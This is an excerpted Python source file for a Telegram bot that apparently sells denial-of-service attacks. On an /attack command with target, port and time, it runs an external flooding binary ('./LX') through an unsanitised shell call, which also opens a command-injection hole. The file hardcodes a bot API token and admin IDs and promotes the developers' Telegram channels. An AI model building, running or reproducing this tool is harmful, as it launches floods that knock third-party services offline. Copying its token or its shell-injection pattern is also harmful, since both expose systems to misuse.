...
bot = telebot.TeleBot('7890888979:AAHVB9qyJmZBu7uA5EOfR3pZ6qKFgdrCnoc')
# DEVELOPER --> @S4_LUCHI
# Admin user IDs
admin_id = ["","5730323890"]
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "PAPA SE BAAT KAR = @Aditya789787."
...
def start_attack_reply(message, target, port, time):
    ...
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/+PttUspKcx_E3YjJl")
    )
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./LX {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"🔺𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🔻 \n\n💢𝗧𝗮𝗿𝗴𝗲𝘁 -> {target} \n💢𝗣𝗼𝗿𝘁: {port} \n💢𝗧𝗶𝗺𝗲: {time}"
        else:
            response = "💠𝐈𝐭'𝐬 𝐓𝐢𝐦𝐞 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤💠 \n\n/𝐚𝐭𝐭𝐚𝐜𝐤 <𝐭𝐚𝐫𝐠𝐞𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n\n READY FOR ATTACK"  # Updated command syntax
    else:
        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 @Aditya789787"
...
def show_command_logs(message):
    ...
    if user_id in allowed_user_ids and is_subscribed(user_id):
        ...
        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 DM TO LX MODS"
    bot.reply_to(message, response)
...
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/c/2182133649/140"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['LX'])
def show_help(message):
    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 --> LX \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑  \n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅 LX MODS.
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/+PttUspKcx_E3YjJl'),
        telebot.types.InlineKeyboardButton('Support', url='https://t.me/+PttUspKcx_E3YjJl')
    )
